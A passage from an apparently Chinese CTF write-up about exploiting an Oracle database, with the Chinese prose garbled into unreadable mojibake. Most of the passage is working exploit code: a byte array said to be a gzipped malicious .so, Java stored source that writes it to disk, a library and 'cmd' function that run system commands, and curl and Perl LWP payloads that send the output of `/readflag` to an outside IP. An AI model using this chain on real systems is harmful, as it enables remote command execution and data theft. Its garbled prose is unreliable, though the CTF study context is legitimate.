class="number">19</span>,<span class="number">106</span>,-<span class="number">72</span>,-<span class="number">70</span>,<span class="number">71</span>,-<span class="number">5</span>,<span class="number">78</span>,<span class="number">92</span>,-<span class="number">2</span>,<span class="number">109</span>,-<span class="number">117</span>,-<span class="number">9</span>,-<span class="number">77</span>,<span class="number">117</span>,<span class="number">20</span>,-<span class="number">94</span>,-<span class="number">25</span>,<span class="number">93</span>,<span class="number">81</span>,-<span class="number">81</span>,-<span class="number">65</span>,<span class="number">2</span>,-<span class="number">4</span>,-<span class="number">61</span>,-<span class="number">100</span>,<span class="number">127</span>,<span class="number">57</span>,-<span class="number">8</span>,<span class="number">71</span>,<span class="number">57</span>,-<span class="number">1</span>,-<span class="number">45</span>,<span class="number">118</span>,<span class="number">31</span>,<span class="number">11</span>,<span class="number">73</span>,-<span class="number">76</span>,<span class="number">126</span>,-<span class="number">70</span>,<span class="number">63</span>,-<span class="number">122</span>,-<span class="number">72</span>,<span class="number">125</span>,<span class="number">61</span>,-<span class="number">81</span>,-<span class="number">72</span>,-<span class="number">50</span>,<span class="number">16</span>,-<span class="number">5</span>,-<span class="number">96</span>,-<span class="number">99</span>,<span class="number">98</span>,-<span class="number">36</span>,<span class="number">51</span>,<span class="number">96</span>,-<span class="number">65</span>,<span class="number">93</span>,<span class="number">127</span>,<span class="number">110</span>,<span class="number">113</span>,-<span class="number">35</span>,<span class="number">34</span>,-<span class="number">34</span>,<span class="number">14</span>,<span class="number">24</span>,<span class="number">127</span>,-<span class="number">48</span>,<span class="number">125</span>,-<span class="number">99</span>,-<span class="number">76</span>,-<span class="number">53</span>,-<span class="number">94</span>,-<span class="number">28</span>,<span class="number">84</span>,-<span class="number">116</span>,<span class="number">47</span>,-<span class="number">15</span>,-<span class="number">81</span>,<span class="number">127</span>,-<span class="number">38</span>,<span class="number">30</span>,-<span class="number">49</span>,-<span class="number">100</span>,-<span class="number">30</span>,-<span class="number">25</span>,<span class="number">7</span>,<span class="number">113</span>,-<span class="number">58</span>,<span class="number">110</span>,-<span class="number">25</span>,-<span class="number">31</span>,-<span class="number">30</span>,-<span class="number">4</span>,<span class="number">35</span>,<span class="number">62</span>,-<span class="number">75</span>,-<span class="number">3</span>,<span class="number">15</span>,-<span class="number">35</span>,-<span class="number">11</span>,-<span class="number">36</span>,<span class="number">46</span>,-<span class="number">38</span>,-<span class="number">25</span>,-<span class="number">54</span>,<span class="number">98</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">98</span>,<span class="number">12</span>,-<span class="number">38</span>,-<span class="number">63</span>,-<span class="number">7</span>,<span class="number">65</span>,-<span class="number">4</span>,<span class="number">100</span>,-<span class="number">5</span>,<span class="number">23</span>,<span class="number">20</span>,<span class="number">63</span>,<span class="number">23</span>,-<span class="number">120</span>,<span class="number">59</span>,-<span class="number">10</span>,<span class="number">120</span>,<span class="number">34</span>,-<span class="number">45</span>,<span class="number">1</span>,-<span class="number">28</span>,<span class="number">8</span>,-<span class="number">55</span>,<span class="number">63</span>,<span class="number">78</span>,-<span class="number">66</span>,<span class="number">74</span>,-<span class="number">14</span>,-<span class="number">113</span>,-<span class="number">73</span>,<span class="number">95</span>,<span class="number">43</span>,-<span class="number">7</span>,-<span class="number">57</span>,-<span class="number">55</span>,<span class="number">111</span>,<span class="number">8</span>,<span class="number">104</span>,-<span class="number">89</span>,<span class="number">49</span>,-<span class="number">64</span>,-<span class="number">65</span>,<span class="number">71</span>,-<span class="number">14</span>,-<span class="number">113</span>,-<span class="number">61</span>,<span class="number">39</span>,-<span class="number">55</span>,-<span class="number">68</span>,<span class="number">89</span>,<span class="number">48</span>,<span class="number">7</span>,<span class="number">122</span>,<span class="number">122</span>,-<span class="number">28</span>,<span class="number">36</span>,-<span class="number">103</span>,<span class="number">14</span>,-<span class="number">77</span>,<span class="number">87</span>,-<span class="number">51</span>,-<span class="number">116</span>,-<span class="number">102</span>,<span class="number">100</span>,-<span class="number">31</span>,-<span class="number">12</span>,<span class="number">5</span>,-<span class="number">94</span>,-<span class="number">86</span>,<span class="number">122</span>,<span class="number">78</span>,-<span class="number">19</span>,<span class="number">77</span>,-<span class="number">25</span>,-<span class="number">70</span>,-<span class="number">75</span>,-<span class="number">76</span>,-<span class="number">86</span>,-<span class="number">101</span>,-<span class="number">71</span>,<span class="number">124</span>,<span class="number">65</span>,-<span class="number">43</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">73</span>,<span class="number">50</span>,-<span class="number">105</span>,-<span class="number">23</span>,<span class="number">79</span>,<span class="number">27</span>,-<span class="number">90</span>,-<span class="number">95</span>,-<span class="number">45</span>,<span class="number">69</span>,-<span class="number">21</span>,<span class="number">91</span>,-<span class="number">125</span>,<span class="number">5</span>,-<span class="number">33</span>,-<span class="number">89</span>,<span class="number">84</span>,<span class="number">45</span>,-<span class="number">97</span>,-<span class="number">41</span>,-<span class="number">122</span>,<span class="number">84</span>,<span class="number">35</span>,<span class="number">107</span>,-<span class="number">26</span>,-<span class="number">121</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">94</span>,-<span class="number">53</span>,<span class="number">24</span>,-<span class="number">86</span>,<span class="number">62</span>,-<span class="number">112</span>,-<span class="number">55</span>,<span class="number">12</span>,<span class="number">81</span>,-<span class="number">119</span>,-<span class="number">53</span>,<span class="number">82</span>,<span class="number">105</span>,<span class="number">77</span>,-<span class="number">45</span>,<span class="number">83</span>,-<span class="number">43</span>,<span class="number">24</span>,-<span class="number">20</span>,-<span class="number">89</span>,-<span class="number">61</span>,<span class="number">81</span>,-<span class="number">43</span>,-<span class="number">26</span>,-<span class="number">114</span>,-<span class="number">122</span>,-<span class="number">74</span>,-<span class="number">124</span>,-<span class="number">102</span>,<span class="number">104</span>,<span class="number">111</span>,<span class="number">98</span>,-<span class="number">119</span>,<span class="number">0</span>,-<span class="number">84</span>,<span class="number">65</span>,-<span class="number">42</span>,<span class="number">87</span>,<span class="number">33</span>,-<span class="number">89</span>,-<span class="number">10</span>,<span class="number">105</span>,<span class="number">89</span>,-<span class="number">99</span>,<span class="number">69</span>,-<span class="number">7</span>,<span class="number">55</span>,-<span class="number">19</span>,<span class="number">110</span>,<span class="number">111</span>,<span class="number">104</span>,-<span class="number">37</span>,<span class="number">30</span>,-<span class="number">89</span>,-<span class="number">34</span>,-<span class="number">106</span>,-<span class="number">10</span>,<span class="number">46</span>,<span class="number">53</span>,-<span class="number">95</span>,-<span class="number">128</span>,<span class="number">64</span>,<span class="number">105</span>,-<span class="number">22</span>,-<span class="number">96</span>,-<span class="number">82</span>,-<span class="number">50</span>,-<span class="number">74</span>,<span class="number">56</span>,<span class="number">74</span>,<span class="number">91</span>,<span class="number">90</span>,<span class="number">119</span>,<span class="number">54</span>,<span class="number">54</span>,-<span class="number">76</span>,-<span class="number">86</span>,<span class="number">59</span>,-<span class="number">101</span>,-<span class="number">101</span>,-<span class="number">97</span>,<span class="number">79</span>,<span class="number">116</span>,-<span class="number">86</span>,-<span class="number">99</span>,<span class="number">13</span>,-<span class="number">115</span>,-<span class="number">83</span>,<span class="number">9</span>,-<span class="number">22</span>,<span class="number">101</span>,-<span class="number">35</span>,-<span class="number">34</span>,<span class="number">51</span>,-<span class="number">65</span>,-<span class="number">64</span>,<span class="number">73</span>,<span class="number">25</span>,-<span class="number">88</span>,<span class="number">119</span>,<span class="number">39</span>,<span class="number">10</span>,-<span class="number">80</span>,<span class="number">76</span>,<span class="number">2</span>,-<span class="number">65</span>,<span class="number">12</span>,-<span class="number">123</span>,<span class="number">7</span>,-<span class="number">56</span>,<span class="number">66</span>,-<span class="number">16</span>,-<span class="number">76</span>,<span class="number">67</span>,-<span class="number">28</span>,-<span class="number">62</span>,<span class="number">80</span>,-<span class="number">58</span>,-<span class="number">44</span>,-<span class="number">70</span>,<span class="number">41</span>,-<span class="number">101</span>,<span class="number">121</span>,-<span class="number">121</span>,-<span class="number">5</span>,-<span class="number">16</span>,<span class="number">42</span>,-<span class="number">101</span>,<span class="number">51</span>,<span class="number">13</span>,-<span class="number">71</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">32</span>,<span class="number">119</span>,<span class="number">15</span>,-<span class="number">92</span>,-<span class="number">46</span>,<span class="number">122</span>,<span class="number">117</span>,<span class="number">74</span>,<span class="number">39</span>,-<span class="number">74</span>,-<span class="number">43</span>,-<span class="number">89</span>,<span class="number">21</span>,-<span class="number">6</span>,-<span class="number">120</span>,-<span class="number">84</span>,<span class="number">15</span>,<span class="number">101</span>,-<span class="number">87</span>,-<span class="number">46</span>,<span class="number">97</span>,<span class="number">51</span>,-<span class="number">17</span>,-<span class="number">108</span>,-<span class="number">20</span>,<span class="number">55</span>,-<span class="number">14</span>,-<span class="number">123</span>,<span class="number">84</span>,<span class="number">46</span>,-<span class="number">21</span>,<span class="number">49</span>,<span class="number">84</span>,<span class="number">90</span>,-<span class="number">106</span>,<span class="number">55</span>,-<span class="number">46</span>,<span class="number">26</span>,-<span class="number">85</span>,<span class="number">8</span>,<span class="number">87</span>,-<span class="number">3</span>,<span class="number">105</span>,-<span class="number">109</span>,-<span class="number">56</span>,-<span class="number">10</span>,<span class="number">77</span>,-<span class="number">77</span>,<span class="number">75</span>,-<span class="number">71</span>,<span class="number">55</span>,<span class="number">71</span>,<span class="number">47</span>,<span class="number">76</span>,<span class="number">99</span>,-<span class="number">112</span>,-<span class="number">98</span>,-<span class="number">19</span>,-<span class="number">87</span>,-<span class="number">107</span>,-<span class="number">13</span>,<span class="number">57</span>,<span class="number">93</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">34</span>,<span class="number">27</span>,<span class="number">125</span>,-<span class="number">16</span>,<span class="number">116</span>,-<span class="number">6</span>,-<span class="number">12</span>,-<span class="number">4</span>,-<span class="number">76</span>,-<span class="number">27</span>,<span class="number">72</span>,-<span class="number">99</span>,-<span class="number">57</span>,-<span class="number">28</span>,<span class="number">40</span>,-<span class="number">16</span>,-<span class="number">102</span>,-<span class="number">10</span>,-<span class="number">96</span>,<span class="number">101</span>,<span class="number">82</span>,<span class="number">73</span>,-<span class="number">62</span>,<span class="number">90</span>,<span class="number">116</span>,<span class="number">58</span>,<span class="number">113</span>,-<span class="number">38</span>,-<span class="number">23</span>,<span class="number">46</span>,<span class="number">20</span>,-<span class="number">120</span>,<span class="number">76</span>,<span class="number">23</span>,<span class="number">74</span>,-<span class="number">122</span>,<span class="number">62</span>,<span class="number">84</span>,-<span class="number">65</span>,-<span class="number">107</span>,-<span class="number">9</span>,-<span class="number">73</span>,-<span class="number">64</span>,-<span class="number">10</span>,<span class="number">63</span>,<span class="number">119</span>,<span class="number">14</span>,<span class="number">67</span>,<span class="number">80</span>,-<span class="number">66</span>,<span class="number">15</span>,-<span class="number">126</span>,-<span class="number">49</span>,-<span class="number">103</span>,<span class="number">98</span>,-<span class="number">23</span>,<span class="number">69</span>,<span class="number">127</span>,-<span class="number">48</span>,<span class="number">61</span>,<span class="number">2</span>,-<span class="number">11</span>,-<span class="number">72</span>,<span class="number">47</span>,-<span class="number">18</span>,-<span class="number">27</span>,-<span class="number">12</span>,-<span class="number">72</span>,<span class="number">127</span>,-<span class="number">16</span>,-<span class="number">1</span>,<span class="number">27</span>,-<span class="number">35</span>,<span class="number">68</span>,-<span class="number">100</span>,<span class="number">61</span>,<span class="number">17</span>,-<span class="number">11</span>,-<span class="number">72</span>,<span class="number">111</span>,<span class="number">34</span>,-<span class="number">29</span>,<span class="number">62</span>,-<span class="number">58</span>,-<span class="number">6</span>,-<span class="number">107</span>,<span class="number">92</span>,<span class="number">122</span>,-<span class="number">36</span>,-<span class="number">49</span>,-<span class="number">22</span>,-<span class="number">95</span>,<span class="number">109</span>,-<span class="number">44</span>,-<span class="number">29</span>,<span class="number">62</span>,-<span class="number">116</span>,-<span class="number">116</span>,-<span class="number">5</span>,<span class="number">46</span>,<span class="number">66</span>,-<span class="number">30</span>,<span class="number">108</span>,-<span class="number">123</span>,<span class="number">56</span>,<span class="number">123</span>,<span class="number">32</span>,-<span class="number">22</span>,<span class="number">113</span>,-<span class="number">33</span>,<span class="number">67</span>,-<span class="number">82</span>,-<span class="number">32</span>,-<span class="number">58</span>,<span class="number">31</span>,-<span class="number">30</span>,-<span class="number">104</span>,-<span class="number">27</span>,-<span class="number">37</span>,<span class="number">76</span>,-<span class="number">71</span>,-<span class="number">12</span>,-<span class="number">72</span>,-<span class="number">81</span>,<span class="number">34</span>,-<span class="number">57</span>,<span class="number">2</span>,-<span class="number">58</span>,-<span class="number">113</span>,-<span class="number">48</span>,-<span class="number">95</span>,<span class="number">12</span>,-<span class="number">11</span>,-<span class="number">72</span>,-<span class="number">113</span>,<span class="number">35</span>,-<span class="number">29</span>,-<span class="number">3</span>,-<span class="number">13</span>,-<span class="number">13</span>,-<span class="number">121</span>,-<span class="number">9</span>,-<span class="number">97</span>,<span class="number">5</span>,<span class="number">125</span>,<span class="number">35</span>,-<span class="number">40</span>,-<span class="number">8</span>,<span class="number">94</span>,-<span class="number">128</span>,-<span class="number">20</span>,<span class="number">126</span>,-<span class="number">49</span>,<span class="number">88</span>,-<span class="number">32</span>,-<span class="number">93</span>,<span class="number">31</span>,<span class="number">36</span>,-<span class="number">98</span>,<span class="number">28</span>,-<span class="number">89</span>,-<span class="number">69</span>,-<span class="number">14</span>,-<span class="number">39</span>,-<span class="number">16</span>,<span class="number">125</span>,<span class="number">3</span>,-<span class="number">63</span>,<span class="number">63</span>,-<span class="number">1</span>,<span class="number">2</span>,-<span class="number">89</span>,-<span class="number">113</span>,<span class="number">69</span>,<span class="number">57</span>,-<span class="number">26</span>,-<span class="number">22</span>,-<span class="number">13</span>,<span class="number">105</span>,<span class="number">115</span>,-<span class="number">81</span>,<span class="number">112</span>,-<span class="number">6</span>,-<span class="number">6</span>,-<span class="number">88</span>,-<span class="number">105</span>,-<span class="number">7</span>,-<span class="number">7</span>,<span class="number">10</span>,<span class="number">115</span>,-<span class="number">4</span>,<span class="number">38</span>,-<span class="number">89</span>,-<span class="number">57</span>,-<span class="number">3</span>,<span class="number">26</span>,-<span class="number">7</span>,-<span class="number">5</span>,-<span class="number">128</span>,-<span class="number">2</span>,<span class="number">17</span>,-<span class="number">57</span>,<span class="number">57</span>,<span class="number">61</span>,-<span class="number">18</span>,<span class="number">115</span>,-<span class="number">56</span>,<span class="number">17</span>,-<span class="number">82</span>,<span class="number">62</span>,<span class="number">127</span>,-<span class="number">1</span>,<span class="number">111</span>,-<span class="number">127</span>,-<span class="number">66</span>,-<span class="number">104</span>,<span class="number">3</span>,<span class="number">20</span>,-<span class="number">13</span>,<span class="number">50</span>,-<span class="number">97</span>,<span class="number">27</span>,-<span class="number">60</span>,-<span class="number">81</span>,-<span class="number">65</span>,-<span class="number">109</span>,-<span class="number">100</span>,<span class="number">62</span>,<span class="number">40</span>,<span class="number">111</span>,<span class="number">46</span>,-<span class="number">88</span>,-<span class="number">1</span>,-<span class="number">45</span>,-<span class="number">100</span>,<span class="number">126</span>,<span class="number">85</span>,-<span class="number">52</span>,-<span class="number">53</span>,-<span class="number">121</span>,-<span class="number">72</span>,-<span class="number">6</span>,-<span class="number">4</span>,<span class="number">124</span>,-<span class="number">98</span>,<span class="number">37</span>,-<span class="number">50</span>,<span class="number">26</span>,-<span class="number">57</span>,-<span class="number">11</span>,<span class="number">85</span>,-<span class="number">52</span>,-<span class="number">93</span>,-<span class="number">85</span>,-<span class="number">10</span>,-<span class="number">81</span>,-<span class="number">49</span>,-<span class="number">49</span>,-<span class="number">1</span>,-<span class="number">25</span>,-<span class="number">124</span>,-<span class="number">19</span>,-<span class="number">22</span>,-<span class="number">82</span>,-<span class="number">9</span>,<span class="number">67</span>,-<span class="number">36</span>,-<span class="number">9</span>,<span class="number">101</span>,<span class="number">111</span>,-<span class="number">67</span>,<span class="number">32</span>,-<span class="number">3</span>,<span class="number">85</span>,-<span class="number">30</span>,-<span class="number">51</span>,-<span class="number">59</span>,<span class="number">42</span>,-<span class="number">26</span>,<span class="number">41</span>,-<span class="number">126</span>,<span class="number">30</span>,-<span class="number">13</span>,<span class="number">19</span>,<span class="number">75</span>,<span class="number">57</span>,<span class="number">29</span>,<span class="number">62</span>,-<span class="number">57</span>,-<span class="number">61</span>,-<span class="number">60</span>,-<span class="number">71</span>,<span class="number">127</span>,-<span class="number">44</span>,<span class="number">99</span>,-<span class="number">34</span>,-<span class="number">41</span>,-<span class="number">107</span>,-<span class="number">75</span>,<span class="number">14</span>,-<span class="number">57</span>,-<span class="number">18</span>,-<span class="number">45</span>,-<span class="number">1</span>,-<span class="number">73</span>,-<span class="number">100</span>,<span class="number">30</span>,-<span class="number">33</span>,<span class="number">55</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">80</span>,-<span class="number">1</span>,<span class="number">3</span>,-<span class="number">89</span>,<span class="number">47</span>,-<span class="number">26</span>,-<span class="number">93</span>,-<span class="number">43</span>,<span class="number">120</span>,-<span class="number">21</span>,-<span class="number">15</span>,<span class="number">122</span>,-<span class="number">60</span>,-<span class="number">113</span>,-<span class="number">32</span>,<span class="number">67</span>,<span class="number">61</span>,-<span class="number">66</span>,<span class="number">7</span>,<span class="number">69</span>,<span class="number">3</span>,-<span class="number">12</span>,-<span class="number">4</span>,-<span class="number">6</span>,-<span class="number">103</span>,<span class="number">0</span>,<span class="number">31</span>,-<span class="number">1</span>,-<span class="number">114</span>,-<span class="number">117</span>,-<span class="number">6</span>,-<span class="number">91</span>,<span class="number">1</span>,<span class="number">122</span>,<span class="number">55</span>,-<span class="number">5</span>,-<span class="number">27</span>,-<span class="number">81</span>,-<span class="number">43</span>,-<span class="number">128</span>,-<span class="number">66</span>,<span class="number">31</span>,<span class="number">10</span>,-<span class="number">39</span>,-<span class="number">9</span>,-<span class="number">94</span>,-<span class="number">7</span>,-<span class="number">28</span>,-<span class="number">18</span>,-<span class="number">65</span>,<span class="number">31</span>,<span class="number">17</span>,-<span class="number">30</span>,-<span class="number">1</span>,-<span class="number">35</span>,-<span class="number">32</span>,-<span class="number">44</span>,<span class="number">122</span>,-<span class="number">121</span>,<span class="number">15</span>,<span class="number">112</span>,<span class="number">3</span>,-<span class="number">26</span>,-<span class="number">57</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">64</span>,-<span class="number">65</span>,-<span class="number">16</span>,<span class="number">41</span>,-<span class="number">121</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">126</span>,<span class="number">94</span>,-<span class="number">1</span>,<span class="number">23</span>,-<span class="number">65</span>,<span class="number">51</span>,<span class="number">112</span>,-<span class="number">83</span>,<span class="number">8</span>,<span class="number">60</span>,<span class="number">0</span>,<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†™ä¸€ä¸ª java source è§£å‹å¹¶è¾“å‡ºæ¶æ„ so</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">create or replace and compile java source named <span class="string">&quot;WriteFile&quot;</span> as</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteFile</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">write</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;your_code&#125;;</span><br><span class="line">        <span class="type">GZIPInputStream</span> <span class="variable">gzipInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data));</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = gzipInputStream.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            fileOutputStream.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        gzipInputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;write ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ code å¤ªé•¿ï¼Œå¯èƒ½æœ‰ç‚¹å¡ï¼Œæ”¾ä¸Šé¢äº†.</p><p>åˆ›å»ºä¸€ä¸ªå‡½æ•°è°ƒç”¨è¯¥ javasource</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create or replace function <span class="title function_">write_so</span><span class="params">(path varchar2)</span> <span class="keyword">return</span> varchar2 as language java name <span class="string">&#x27;WriteFile.write(java.lang.String) return java.lang.String&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="title function_">if</span> <span class="params">(write_so(<span class="string">&#x27;/u01/app/oracle/product/12.1.0.2/dbhome_1/lib/exp.so&#x27;</span>)</span> = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.put_line(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.put_line(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>å†™å…¥ so æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create or replace library libexp as <span class="string">&#x27;/u01/app/oracle/product/12.1.0.2/dbhome_1/lib/exp.so&#x27;</span>;</span><br></pre></td></tr></table></figure><p>åŠ è½½æˆ lib</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create or replace function <span class="title function_">cmd</span><span class="params">(str varchar2)</span> <span class="keyword">return</span> varchar2 as language c library libexp name <span class="string">&quot;cmd&quot;</span>;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ lib åˆ›å»º cmd å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="keyword">if</span> (cmd(<span class="string">&#x27;/bin/cu&#x27;</span>||<span class="string">&#x27;rl ht&#x27;</span>||<span class="string">&#x27;tp://192.168.111.128:1145/?a=`/readflag`&#x27;</span>) = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.put_line(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.put_line(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p><code>BMS_OUTPUT.PUT_LINE</code>  æ˜¯ä¸€ä¸ªè¿‡ç¨‹ï¼Œç”¨äºå‘ç”¨æˆ·ä¼šè¯çš„è¾“å‡ºç¼“å†²åŒºä¸­å†™å…¥ä¸€è¡Œæ–‡æœ¬ã€‚åœ¨ SQL*Plus æˆ– SQLcl ç­‰å·¥å…·ä¸­æ‰§è¡Œè¿™ä¸ªåŒ¿åå—ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®  <code>SET SERVEROUTPUT ON</code>  æ¥æŸ¥çœ‹è¾“å‡º.</p><p>ğŸ‘´tmd çœŸæ˜¯ä¸ª sb, ä¸€å¼€å§‹ so æ–‡ä»¶å‡ºå¤§é—®é¢˜ï¼Œå†™é”™äº†æ—¥.cmd å‡½æ•°å½“ nmd å‚æ•°ä¼ ç»™ system,ğŸ‘´tm æœ‰ç—….</p><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231222205819700.png" alt="image-20231222205819700"></p><p>æ® X1 è¯´ï¼Œé¢˜ç›®é™åˆ¶äº†å‘½ä»¤ï¼Œåªèƒ½æ‰§è¡Œ oracle çš„ bin ä¸‹çš„å‘½ä»¤ï¼Œæ­£å¥½å­¦ä¸€ä¸‹å…¶å®ƒçš„å§¿åŠ¿.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line"><span class="title function_">if</span> <span class="params">(cmd(<span class="string">&#x27;/u01/app/oracle-product/12.1.0.2/dbhome_1/perl/bin/perl -MLWP::Us&#x27;</span>||<span class="string">&#x27;erAgent -e &quot;\$ua = LWP::Us&#x27;</span>||<span class="string">&#x27;erAgent-&gt;new; \$response = \$ua-&gt;get(&#x27;</span><span class="string">&#x27;h&#x27;</span>||<span class="string">&#x27;ttp://192.168.111.128:1145/?a=`/readflag`&#x27;</span><span class="string">&#x27;);&quot;&#x27;</span>)</span> = <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">then dbms_output.put_line(<span class="string">&#x27;Valid&#x27;</span>);</span><br><span class="line"><span class="keyword">else</span> dbms_output.put_line(<span class="string">&#x27;Invalid&#x27;</span>);</span><br><span class="line">end <span class="keyword">if</span>;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/22/%E4%BA%AC%E9%BA%92CTF%E8%A1%A5%E5%AE%8C%E8%AE%A1%E5%88%92/image-20231222210527474.png" alt="image-20231222210527474"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MLWP::UserAgent -e <span class="string">&quot;$ua=LWP::UserAgent-&gt;new;$response = $ua-&gt;get(&#x27;http://ip:port&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>perl å‘½ä»¤ï¼Œæœ¬æ¥æ˜¯ç”¨äºè¿›è¡Œç³»ç»Ÿä»»åŠ¡ç®¡ç†çš„ï¼Œç”¨äºæ‰§è¡Œ perl è¯­è¨€.</p><p><code>-M</code>  å‚æ•°ç”¨äºåŠ è½½æ¨¡å—ï¼Œ <code>LWP</code>  æ˜¯ Perl ä¸­çš„ä¸€ä¸ª HTTP å®¢æˆ·ç«¯åº“ï¼Œå®ƒæä¾›äº†æ–¹ä¾¿çš„æ¥å£æ¥è¿›è¡Œ HTTP è¯·æ±‚.</p><p><code>LWP::UserAgent</code>  ç”¨äºæ‰§è¡Œ HTTP è¯·æ±‚ã€‚</p><p>æ¥ä¸‹æ¥å¤§æ¦‚å°±æ˜¯ç”¨ç®­å¤´çš„æ–¹å¼åˆ›å»ºä¸€ä¸ª UserAgent å¯¹è±¡ï¼Œç„¶åå‘é€ä¸€ä¸ª get è¯·æ±‚ï¼Œå¥½åƒè¿™ä¸ª get è¯·æ±‚å¯ä»¥åƒ curl ä¸€æ ·æ’å…¥åå¼•å·æ‰§è¡Œå‘½ä»¤ä¹‹ç±»çš„.</p><p>æ–°å§¿åŠ¿ get!!!</p><h1 id="end"><span id="end"> END</span></h1><p>èŠœæ¹–ï¼Œç»ˆäºå¤ç°å®Œäº†ï¼Œæ¯”ç»ˆå‡ºé¢˜ç›® ğŸç²—æ¥è¿˜âˆšâ‘§çˆ½.</p><p>md æœŸæœ«äº†ï¼ŒğŸ‘´å†ä¸å­¦æ–‡åŒ–è¯¾è¦æŒ‚äº†ï¼Œä¸Šä¸ªå¤§å­¦è¿™ä¹ˆå¤šäº‹ï¼Œè‰¹.</p><p>æ¦‚ç‡è®º æ•°æ®ç»“æ„ æ•°æ®åº“ å¤§å­¦ç‰©ç†ï¼Œè¿˜æœ‰å‡ é—¨è¦èƒŒçš„æ–‡ç§‘ï¼Œå¼€å§‹å–æ´—è„šæ°´äº†ï¼Œå¤‡è€ƒæœŸæœ«å®³å¾—ğŸ‘´è¿™ä¸ªç³»åˆ—è€½è¯¯äº†è¿™ä¹ˆä¹…ï¼Œç»ˆäºè¡¥å®Œäº†.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
